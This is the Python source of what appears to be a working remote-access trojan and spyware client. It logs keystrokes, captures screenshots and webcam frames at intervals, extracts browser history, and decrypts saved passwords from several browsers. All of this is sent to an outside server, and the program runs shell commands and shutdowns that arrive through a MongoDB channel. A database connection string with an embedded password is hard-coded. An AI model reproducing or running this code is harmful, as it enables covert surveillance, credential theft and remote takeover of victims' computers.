import requests
import urllib.request
import socket
from pynput import keyboard
import pyautogui
import asyncio
import os
from datetime import datetime
import atexit
from pymongo import MongoClient
import threading
import psutil
import signal
import platform
import pygetwindow as gw
import cv2
import sqlite3
import shutil
import json
import win32crypt
from Cryptodome.Cipher import AES
import base64
from pynput.keyboard import Controller
import hashlib
import uuid
import subprocess
import time

API_URL = "https://money-cat-bot.onrender.com"
COMPUTER_NAME = socket.gethostname()

def get_id():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    return hashlib.sha256(mac.encode()).hexdigest()[:20]

COMPUTER_ID = get_id()

CAMERA_INDEX = 0
DELAY = 60

ACTIVITY_ROLE_ID=1345172216731664424
ERROR_COLOR="#ff0000"

keys_pressed = []
lock = asyncio.Lock()

pyautogui.FAILSAFE = False

cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)

client = MongoClient("mongodb+srv://money:WRyAg58QYq5L1S43@moneybot.0zo57.mongodb.net/?retryWrites=true&w=majority&appName=MoneyBot")  # Zmienna URL powinna być poprawna
db = client['test']
collection = db['requests']

def watch_changes():
    change_stream = collection.watch()
    print("😎 Started watching for changes!")
    for change in change_stream:
        data = change.get("fullDocument", {})
        name = data.get("COMPUTER_ID")
        type = data.get("type")

        if name == COMPUTER_ID:
            send_to_express(f"`✅` Successfully received `{type}` request!", COMPUTER_ID)
            match type and type.strip().lower():
                case "winr":
                    args = data.get("args", {})
                    content = args.get("content")
                    pyautogui.hotkey('win', 'r')
                    if content:
                        pyautogui.write(content)
                        pyautogui.press("enter")
                    send_to_express("`🔧` Successfully opened Windows + R!", COMPUTER_ID)
                        
                case "note":
                    args = data.get("args", {})
                    content = args.get("content")
                    if content:
                        with open("temp_note.txt", "w") as f:
                            f.write(content)
                        subprocess.Popen(["notepad", "temp_note.txt"])
                        send_to_express(f"`📝` Successfully opened Notepad with content!", COMPUTER_ID)
                    else:
                        subprocess.Popen("notepad")
                        send_to_express("`📝` Successfully opened Notepad!", COMPUTER_ID)
                        
                case "cmd":
                    args = data.get("args", {})
                    content = args.get("content")
                    if content:
                        subprocess.Popen(['cmd', '/K', content], creationflags=subprocess.CREATE_NEW_CONSOLE)
                        send_to_express(f"`💻` Successfully opened cmd with command `{content}`!", COMPUTER_ID)
                    else:
                        subprocess.Popen('cmd', creationflags=subprocess.CREATE_NEW_CONSOLE)
                        send_to_express("`💻` Successfully opened cmd!", COMPUTER_ID)
                
                case "shutdown":
                    os.system("shutdown /s /f /t 0")
                    
                case "ss":
                    send_screenshot_now()
                
                case "camera":
                    send_camera_frame_now()

                case "info":
                    send_info_now()

                case "utils":
                    send_utils_now()

                case "network_info":
                    send_network_info_now()

                case "processes":
                    send_processes_now()
            
                case "process":
                    args = data.get("args", {})
                    pid = args.get("id")
                    activity = args.get("activity")
                    if pid is None:
                        send_to_express("`⚠️` No PID provided!", COMPUTER_ID)
                    if isinstance(pid, str) and pid.isdigit():
                        pid = int(pid)
                    if activity == "kill":
                        try:
                            if psutil.pid_exists(pid):
                                if platform.system() == "Windows":
                                    os.system(f"taskkill /PID {pid} /F")
                                else:
                                    os.kill(pid, signal.SIGTERM)
                                send_to_express(f"`💀` Successfully killed process `{pid}`!", COMPUTER_ID)
                            else:
                                send_to_express(f"`❌` Process `{pid}` not found!", COMPUTER_ID)
                        except ValueError:
                            send_to_express(f"`⚠️` Invalid PID `{pid}`!", COMPUTER_ID)
                        except PermissionError:
                            send_to_express(f"`⛔` No permission to kill process `{pid}`!", COMPUTER_ID)
                        except Exception as e:
                            send_to_express(f"`⚠️` Error killing process `{pid}`: {e}", COMPUTER_ID)

                case "applications":
                    send_to_express(list_open_apps(), COMPUTER_ID, code_block=True, isEmbed=True, Title="Currently Open Applications", Color=True)

                case "app":
                    args = data.get("args", {})
                    activity = args.get("activity")
                    name = args.get("name")
                    if activity == "close":
                        close_app_by_name(name)
                        send_to_express(f"`💣` Closed `{get_full_app_name(name)}` application!", COMPUTER_ID)
                
                case "history":
                    args = data.get("args", {})
                    name = args.get("name")
                    id = args.get("id")
                    history_array = get_browser_history(browser=name, limit=id)
                    try:
                        requests.post(f"{API_URL}/history", json={"COMPUTER_ID": COMPUTER_ID, "history": history_array, "browser": name})
                    except requests.exceptions.RequestException as e:
                        print(e)
                
                case "passwords":
                    args = data.get("args", {})
                    name = args.get("name")
                    passwords_array = get_browser_passwords(browser=name)
                    try:
                        requests.post(f"{API_URL}/passwords", json={"COMPUTER_ID": COMPUTER_ID, "passwords": passwords_array, "browser": name})
                    except requests.exceptions.RequestException as e:
                        print(e)
                
                case "keyboard":
                    keyboard = Controller()
                    args = data.get("args", {})
                    activity = args.get("activity")
                    content = args.get("content")
                    if activity == "write":
                        try:
                            keyboard.type(content)
                            send_to_express(f"`💻` Successfully sent `{content}` to keyboard!", COMPUTER_ID)
                        except Exception as e:
                            send_to_express(f"`⚠️` Error typing `{content}`: {e}", COMPUTER_ID)
                    elif activity == "key":
                        try:
                            if content in pyautogui.KEYBOARD_KEYS:
                                pyautogui.press(content)
                                send_to_express(f"`💻` Successfully sent `[{content.upper()}]` to keyboard!", COMPUTER_ID)
                            else:
                                send_to_express(f"`❌` Key `[{content.upper()}]` not found!", COMPUTER_ID)
                        except Exception as e:
                            send_to_express(f"`⚠️` Error pressing key `[{content.upper()}]`: {e}", COMPUTER_ID)
                    elif activity == "list":
                        try:
                            excluded_keys = set("!\"#$%&'()*+,-./0123456789:;<=>?@[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~")
                            filtered_keys = [key.strip() for key in pyautogui.KEYBOARD_KEYS if key.strip() and key not in excluded_keys]
                            keys_list = "\n".join(filtered_keys)
                            send_to_express(keys_list, computer_id=COMPUTER_ID, code_block=True, isEmbed=True, Title="Keyboard Available Keys List", Color=True)
                        except Exception as e:
                            send_to_express(f"`⚠️` Error listing keys: {e}", COMPUTER_ID)

            document_id = data.get("_id")
            if document_id:
                collection.delete_one({"_id": document_id})

def run_watch():
    thread = threading.Thread(target=watch_changes)
    thread.daemon = True
    thread.start()

def send_to_express(message, computer_id=None, code_block=False, isEmbed=False, Title=None, Color=False, custom_color=None):
    payload = {
        "message": message,
        "COMPUTER_ID": computer_id,
        "isEmbed": isEmbed,
        "Title": Title,
        "Color": Color,
        "custom_color": custom_color,
    }

    if (code_block):
        payload["message"] = f"```{message}```"

    try:
        requests.post(f"{API_URL}/send", json=payload)
    except requests.exceptions.RequestException as e:
        print(e)

def on_press(key):
    try:
        keys_pressed.append(key.char)
    except AttributeError:
        keys_pressed.append(f"[{key.name.upper()}]")

listener = keyboard.Listener(on_press=on_press)
listener.start()

async def send_screenshot():
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    local_path = os.path.join(documents_path, "local")

    os.makedirs(local_path, exist_ok=True)

    while True:
        await asyncio.sleep(DELAY)

        screenshot_path = os.path.join(local_path, f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
        
        try:
            pyautogui.screenshot().save(screenshot_path)
        except Exception as e:
            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error taking auto screenshot", custom_color=ERROR_COLOR, code_block=True)
            continue

        try:
            with open(screenshot_path, 'rb') as f:
                files = {'screenshot': f}
                requests.post(f"{API_URL}/upload-screenshot", files=files, data={"COMPUTER_ID": COMPUTER_ID})
        except requests.exceptions.RequestException as e:
            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending auto screenshot", custom_color=ERROR_COLOR, code_block=True)
            continue

        for attempt in range(5):
            try:
                os.remove(screenshot_path)
                break
            except PermissionError as e:
                if attempt == 4:
                    send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error deleting auto screenshot", custom_color=ERROR_COLOR, code_block=True)
                time.sleep(1)

def send_screenshot_now():
    try:
        documents_path = os.path.join(os.path.expanduser("~"), "Documents")
        local_path = os.path.join(documents_path, "local")

        os.makedirs(local_path, exist_ok=True)

        screenshot_path = os.path.join(local_path, f"screenshot_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")
        pyautogui.screenshot().save(screenshot_path)

        with open(screenshot_path, 'rb') as f:
            screenshot_data = f.read()

        files = {'screenshot': screenshot_data}
        data = {
            "message": f"**{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}**",
            "COMPUTER_ID": COMPUTER_ID
        }

        try:
            response = requests.post(f"{API_URL}/upload-screenshot", files=files, data=data)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending screenshot", custom_color=ERROR_COLOR, code_block=True)
            return

        for attempt in range(5):
            try:
                shutil.rmtree(screenshot_path) if os.path.isdir(screenshot_path) else os.remove(screenshot_path)
                break
            except PermissionError:
                time.sleep(1)
        else:
            send_to_express("`❌` Error deleting screenshot file!", COMPUTER_ID)

    except Exception as e:
        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Unexpected Screenshot Error", custom_color=ERROR_COLOR, code_block=True)

def send_info_now():
    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    private_ip = socket.gethostbyname(socket.gethostname())
    user_info = os.getlogin() # Użytkownik systemu
    home_dir = os.path.expanduser("~") # Ścieżka do katalogu domowego
    cwd = os.getcwd() # Ścieżka do katalogu roboczego

    data = {
        "COMPUTER_ID": COMPUTER_ID,
        "external_ip": external_ip,
        "private_ip": private_ip,
        "user_info": user_info,
        "home_dir": home_dir,
        "cwd": cwd,
    }

    try:
        requests.post(f"{API_URL}/info", json=data)
    except requests.exceptions.RequestException as e:
        print(e)

def send_utils_now():
    cpu_percent = psutil.cpu_percent(interval=1)  # Użycie CPU
    memory = psutil.virtual_memory()  # Informacje o pamięci RAM
    disk_usage = psutil.disk_usage('/')  # Informacje o dyskach
    net_if_addrs = psutil.net_if_addrs()  # Sieć (adresy IP, statystyki)

    memory_dict = {
        "total": memory.total,
        "used": memory.used,
        "free": memory.free,
        "percent": memory.percent,
    }

    disk_usage_dict = {
        "total": disk_usage.total,
        "used": disk_usage.used,
        "free": disk_usage.free,
        "percent": disk_usage.percent,
    }

    net_if_addrs_dict = {}
    for interface, addrs in net_if_addrs.items():
        net_if_addrs_dict[interface] = [{"address": addr.address, "netmask": addr.netmask} for addr in addrs]

    data = {
        "COMPUTER_ID": COMPUTER_ID,
        "cpu_percent": f"{cpu_percent}%",
        "memory": memory_dict,
        "disk_usage": disk_usage_dict,
        "net_if_addrs": net_if_addrs_dict,
    }

    try:
        requests.post(f"{API_URL}/utils", json=data)
    except requests.exceptions.RequestException as e:
        print(e)

def send_network_info_now():
    net_if_addrs = psutil.net_if_addrs()  # Sieć (adresy IP, statystyki)

    net_if_addrs_dict = {}
    for interface, addrs in net_if_addrs.items():
        net_if_addrs_dict[interface] = [{"address": addr.address, "netmask": addr.netmask} for addr in addrs]

    try:
        requests.post(f"{API_URL}/network_info", json={ "COMPUTER_ID": COMPUTER_ID, "net_if_addrs": net_if_addrs_dict })
    except requests.exceptions.RequestException as e:
        print(e)

def send_processes_now():
    processes = psutil.process_iter()

    processes_list = []
    for process in processes:
        try:
            processes_list.append({
                "pid": process.pid,
                "name": process.name(),
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    try:
        requests.post(f"{API_URL}/processes", json={ "COMPUTER_ID": COMPUTER_ID, "processes": processes_list })
    except requests.exceptions.RequestException as e:
        print(e)

async def send_keys():
    while True:
        await asyncio.sleep(DELAY)

        async with lock:
            if keys_pressed:
                send_to_express(''.join(keys_pressed), COMPUTER_ID, code_block=True, isEmbed=True, Title="Key Logger")
                keys_pressed.clear()

def start_bot(external_ip, private_ip, id):
    try:
        requests.post(f"{API_URL}/start", json={"COMPUTER_ID": COMPUTER_ID, "COMPUTER_NAME": COMPUTER_NAME, "external_ip": external_ip, "private_ip": private_ip, "id": id})
    except requests.exceptions.RequestException as e:
        print(e)
        
async def send_camera_frame():
    global cap
    
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    local_path = os.path.join(documents_path, "local")  # Ścieżka do folderu local
    os.makedirs(local_path, exist_ok=True)

    while True:
        if not cap.isOpened():
            send_to_express("`❌` Can not get image from camera! `🔄` Restarting camera cap...", COMPUTER_ID)
            cap.release()
            await asyncio.sleep(1)
            cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)
        
        ret, frame = cap.read()
        if not ret:
            send_to_express("`❌` Error connecting to camera frame! Retrying...", COMPUTER_ID)
            await asyncio.sleep(1)
            continue

        frame_path = os.path.join(local_path, f"frame_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")

        try:
            cv2.imwrite(frame_path, frame)  # Zapis klatki
        except Exception as e:
            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error saving camera frame", custom_color=ERROR_COLOR, code_block=True)
            continue

        try:
            with open(frame_path, 'rb') as f:
                response = requests.post(f"{API_URL}/upload-camera", files={'frame': f}, data={"COMPUTER_ID": COMPUTER_ID})
                if response.status_code != 200:
                    send_to_express(f"`❌` Failed to upload frame: `{response.status_code}`", COMPUTER_ID)
        except Exception as e:
            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending camera frame", custom_color=ERROR_COLOR, code_block=True)
            continue  # Nie usuwamy pliku, jeśli nie został wysłany

        for attempt in range(5):
            try:
                os.remove(frame_path)
                break
            except PermissionError as e:
                if attempt == 4:
                    send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error deleting frame", custom_color=ERROR_COLOR, code_block=True)
                time.sleep(1)
        await asyncio.sleep(DELAY)

    cap.release()

def send_camera_frame_now():
    global cap

    if not cap.isOpened():
        send_to_express("`❌` Can not get image from camera! `🔄` Restarting camera cap...", COMPUTER_ID)
        cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)

    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    local_path = os.path.join(documents_path, "local")
    os.makedirs(local_path, exist_ok=True)

    ret, frame = cap.read()
    if not ret:
        send_to_express("`❌` Error connecting to camera frame!", COMPUTER_ID)
        return

    frame_path = os.path.join(local_path, f"frame_{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png")

    try:
        cv2.imwrite(frame_path, frame)  # Zapis klatki
    except Exception as e:
        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error saving camera frame", custom_color=ERROR_COLOR, code_block=True)
        return

    try:
        with open(frame_path, 'rb') as f:
            response = requests.post(f"{API_URL}/upload-camera", files={'frame': f}, data={"COMPUTER_ID": COMPUTER_ID})
            if response.status_code != 200:
                send_to_express(f"`❌` Failed to upload frame: `{response.status_code}`", COMPUTER_ID)
    except Exception as e:
        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error sending camera frame", custom_color=ERROR_COLOR, code_block=True)
        return  # Nie usuwamy pliku, jeśli nie został wysłany

    for attempt in range(5):
        try:
            os.remove(frame_path)
            break
        except PermissionError as e:
            if attempt == 4:
                send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error deleting frame", custom_color=ERROR_COLOR, code_block=True)
            time.sleep(1)  

    cap.release()

async def start():
    print("🎓 Starting the application...")

    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    private_ip = socket.gethostbyname(socket.gethostname())

    start_bot(external_ip, private_ip, id=COMPUTER_ID)
    print('✅ Application started!')
    
    run_watch()

    await asyncio.gather(
        send_screenshot(),
        send_camera_frame(),
        send_keys(),
    )

def list_open_apps():
    windows = gw.getAllTitles()  # Pobiera tytuły wszystkich otwartych okien
    result = ""  # Zmienna do przechowywania nazw aplikacji
    for window in windows:
        if window.strip():  # Sprawdzamy, czy tytuł nie jest pusty
            result += window + "\n"  # Dodajemy tytuł do wyniku, oddzielony przecinkiem
    return result.strip("\n")  # Usuwamy ostatni przecinek i zwracamy wynik

def close_app_by_name(app_name_part):
    windows = gw.getAllTitles()  # Pobiera tytuły wszystkich otwartych okien
    for window in windows:
        if app_name_part.lower() in window.lower():
            app = gw.getWindowsWithTitle(window)[0]
            app.close()

def get_full_app_name(app_name_part):
    windows = gw.getAllTitles()  # Pobiera tytuły wszystkich otwartych okien
    full_app_names = []  # Lista na pełne nazwy aplikacji, które pasują do fragmentu
    for window in windows:
        if app_name_part.lower() in window.lower():  # Sprawdzamy, czy fragment nazwy pasuje
            full_app_names.append(window)  # Dodajemy pełną nazwę aplikacji do listy
    return full_app_names

def get_browser_history(browser="chrome", limit=10):
    try:
        history_db_paths = {
            "edge": os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History'),
            "opera": os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Stable\Default\History'),
            "gx": os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera GX Stable\Default\History'),
            "brave": os.path.expanduser(r'~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History'),
            "firefox": os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox\Profiles\default\places.sqlite'),  # Firefox ma SQLite dla historii
            "chrome": os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History')
        }

        history_db = history_db_paths.get(browser)

        if not os.path.exists(history_db):
            raise FileNotFoundError(f"History file not found: {history_db}")
        
        history_copy = history_db + "_copy"
        shutil.copy2(history_db, history_copy)

        conn = sqlite3.connect(history_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        except sqlite3.DatabaseError as e:
            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="SQLite error while fetching history", custom_color=ERROR_COLOR, code_block=True)

        raw_history = cursor.fetchall()
        conn.close()
        os.remove(history_copy)

        history_list = [{"url": url, "title": title, "visits": visits} for url, title, visits in raw_history]
        return history_list

    except Exception as e:
        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error in get_browser_history", custom_color=ERROR_COLOR, code_block=True)
        return []

def get_encryption_key(browser="chrome"):
    try:
        local_state_paths = {
            "edge": os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Local State"),
            "opera": os.path.join(os.getenv("APPDATA"), r"Opera Software\Opera Stable\Local State"),
            "gx": os.path.join(os.getenv("APPDATA"), r"Opera Software\Opera GX Stable\Local State"),
            "brave": os.path.join(os.getenv("LOCALAPPDATA"), r"BraveSoftware\Brave-Browser\User Data\Local State"),
            "firefox": os.path.join(os.getenv("APPDATA"), r"Mozilla\Firefox\Profiles"),  # Firefox nie ma "Local State", ale dla przykładu
            "chrome": os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
        }

        local_state_path = local_state_paths.get(browser)
        
        if not os.path.exists(local_state_path):
            raise FileNotFoundError(f"Local State file not found: {local_state_path}")

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # Usunięcie "DPAPI"
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    except Exception as e:
        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error in get_encryption_key", custom_color=ERROR_COLOR, code_block=True)
        return None

def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password)[:-16].decode()
    except Exception as e:
        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error decrypting passwor", custom_color=ERROR_COLOR, code_block=True)
        return ""

def get_browser_passwords(browser="chrome"):
    try:
        browser_paths = {
            "edge": os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Login Data"),
            "opera": os.path.join(os.getenv("APPDATA"), r"Opera Software\Opera Stable\Default\Login Data"),
            "gx": os.path.join(os.getenv("APPDATA"), r"Opera Software\Opera GX Stable\Default\Login Data"),
            "brave": os.path.join(os.getenv("LOCALAPPDATA"), r"BraveSoftware\Brave-Browser\User Data\Default\Login Data"),
            "firefox": os.path.join(os.getenv("APPDATA"), r"Mozilla\Firefox\Profiles"),
            "chrome": os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")
        }

        db_path = browser_paths.get(browser)

        if not os.path.exists(db_path):
            raise FileNotFoundError(f"Database file not found: {db_path}")

        temp_db = "LoginData.db"
        shutil.copy2(db_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        except sqlite3.DatabaseError as e:
            send_to_express(e, COMPUTER_ID, isEmbed=True, Title="SQLite error", custom_color=ERROR_COLOR, code_block=True)

        key = get_encryption_key(browser)

        passwords = []
        for url, username, password in cursor.fetchall():
            try:
                decrypted_password = decrypt_password(password, key)
            except Exception as e:
                send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Decryption failed", custom_color=ERROR_COLOR, code_block=True)
                decrypted_password = "❌"

            passwords.append({
                "url": url,
                "username": username,
                "password": decrypted_password
            })

        conn.close()
        os.remove(temp_db)

        return passwords

    except Exception as e:
        send_to_express(e, COMPUTER_ID, isEmbed=True, Title="Error in get_browser_passwords", custom_color=ERROR_COLOR, code_block=True)
        return []

if __name__ == "__main__":
    asyncio.run(start())

cap.release()
cv2.destroyAllWindows()

def on_exit():
    print("❌ Program closing!")

atexit.register(on_exit)